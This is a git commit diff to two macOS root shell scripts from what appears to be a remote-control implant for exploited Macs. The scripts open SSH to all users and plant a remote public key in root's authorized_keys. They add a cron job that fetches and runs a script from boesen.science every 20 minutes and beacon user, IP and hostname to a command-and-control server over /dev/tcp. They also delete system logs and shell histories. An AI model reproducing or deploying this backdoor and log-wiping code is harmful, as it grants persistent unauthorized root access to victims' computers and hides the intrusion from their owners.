d1266f92b1464730c13e2eb552cae57bdefa7fad
ErikBoesen <me@erikboesen.com>
2017-09-20 16:50:01 -0400

    Don't update right after join

--- control/mac/enact.sh
+++ control/mac/enact.sh
@@ -1,22 +1,19 @@
-#!/usr/bin/env bash
+#!/bin/bash
 # MUST be run as root. jm.sh should be used to automate exploitation and running of
 # this script on Macs running OS X <= 10.11.6.
 
-# /sbin/ifconfig isn't in root's path by default, so let's just do this I guess
+# Some programs aren't in $PATH by default
 export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:$PATH
 
-# Remote login/SSHD should already be on and enabled for root. But just in case:
 # Enable SSH
 systemsetup -setremotelogin on >/dev/null
 # Open SSH to all users
 dscl . change /Groups/com.apple.access_ssh RecordName com.apple.access_ssh com.apple.access_ssh-disabled >/dev/null
 
-# Unlike on Linux, we have to fully save the file rather than just piping it into bash.
-# On Macs, each line is executed separately, so things like variables won't work if we just pipe it.
+# Add update to crontab
 (crontab -l 2>/dev/null; echo '*/20 * * * * curl -Lo /tmp/update.sh boesen.science:2042/mac/update.sh; chmod +x /tmp/update.sh; /tmp/update.sh') | crontab -
 
 sshpath="/var/root/.ssh"
-
 mkdir -p "$sshpath" # On most computers, there won't be a .ssh directory initially
 
 rm "$sshpath/authorized_keys" # Just in case
@@ -25,18 +22,22 @@ curl -Lso "$sshpath/authorized_keys" boesen.science:2042/pubkey
 user=$(stat -f "%Su" /dev/console) # Get user currently logged in (in GUI).
 ip=$(/sbin/ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')
 hostname=$(hostname)
-mac=$(/sbin/ifconfig en1 | awk '/ether/{print $2}')
+
+info="$user $ip $hostname"
 
 server="boesen.science"
 PORT=2043
 
 # Send data to C&C
-exec 3<>/dev/tcp/$server/$PORT
-printf "JOIN: $user $ip $hostname $mac" >&3
+exec 3<>/dev/tcp/$server/$port
+printf "JOIN: $info" >&3
 
 function timeout() { perl -e 'alarm shift; exec @ARGV' "$@"; }
 # Print response, time out if none
 timeout 1 cat <&3 && echo
+
+printf "$user $hostname" > /etc/info
+echo "$ip" >> /etc/ips
 
 rm -rf /var/log/*
 rm -f /var/root/.*history /Users/*/.*history
--- control/mac/update.sh
+++ control/mac/update.sh
@@ -1,4 +1,4 @@
-#!/usr/bin/env bash
+#!/bin/bash
 
 # ifconfig is in /sbin and won't work with default PATH
 export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:$PATH
@@ -7,9 +7,8 @@ user=$(stat -f "%Su" /dev/console)
 # Linux's hostname -I doesn't work on Macs
 ip=$(/sbin/ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | paste -sd ',' -)
 hostname=$(hostname)
-#mac=$(/sbin/ifconfig en0 | awk '/ether/{print $2}')
 
-info="$user $ip $hostname"# $mac"
+info="$user $ip $hostname"
 
 server="boesen.science"
 port=2043
@@ -22,7 +21,6 @@ fi
 
 if [[ $(< /etc/info) != "$user $hostname" || $ip_new = true ]]; then
 	printf "$user $hostname" > /etc/info
-
 	printf "UPDATE: $info" >/dev/tcp/$server/$port
 fi
 
@@ -39,6 +37,6 @@ sshpath="/var/root/.ssh"
 
 mkdir -p "$sshpath"
 
-if ! grep boesene $sshpath/authorized_keys; then
+if ! grep -q boesene $sshpath/authorized_keys; then
 	curl -L boesen.science:2042/pubkey >> $sshpath/authorized_keys
 fi
